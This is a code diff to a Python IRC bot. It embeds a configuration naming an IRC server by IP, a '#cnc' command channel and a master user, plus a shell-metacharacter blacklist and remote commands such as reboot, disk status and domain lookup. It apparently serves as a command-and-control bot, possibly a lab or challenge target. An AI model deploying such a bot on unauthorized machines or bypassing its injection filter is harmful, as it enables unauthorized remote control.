@@ -6,6 +6,49 @@ import sys
 import time
 import random
 
+config_json = """
+{
+    "master": "fuch",
+    "authorized_users":["fuch"],
+    "irc": {
+        "host": "159.89.228.177",
+        "port": 9000,
+        "username": "shad0wfuchsia",
+        "channel": "#cnc"
+    },
+    "character_blacklist": "|&;#$^`",
+    "commands": {
+        "hello": {
+            "method": "sayHello"
+        },
+        "dig": {
+            "method": "domainLookup"
+        },
+        "df": {
+            "method": "diskStatus"
+        },
+        "uptime": {
+            "method": "getUptime"
+        },
+        "hostname": {
+            "method": "getHostname"
+        },
+        "reboot": {
+            "method": "doReboot"
+        },
+        "undoreboot": {
+            "method": "undoReboot"
+        },
+        "list": {
+            "method": "listCommands"
+        },
+        "kill_client": {
+            "method": "killClient"
+        }
+    }
+}
+"""
+
 class IRCController(object):
     def __init__(self, **kwargs):
         self.server = kwargs['server']
@@ -305,11 +348,9 @@ class CommandMap(object):
     def killClient(self, args):
         exit(0)
 
-
 # -----------  MAIN -----------
 
-with open('config.json', 'r') as cfg:
-    config = json.load(cfg)
+config = json.loads(config_json)
 
 botname = config['irc']['username'] + str(random.randint(6,66)*100)
 
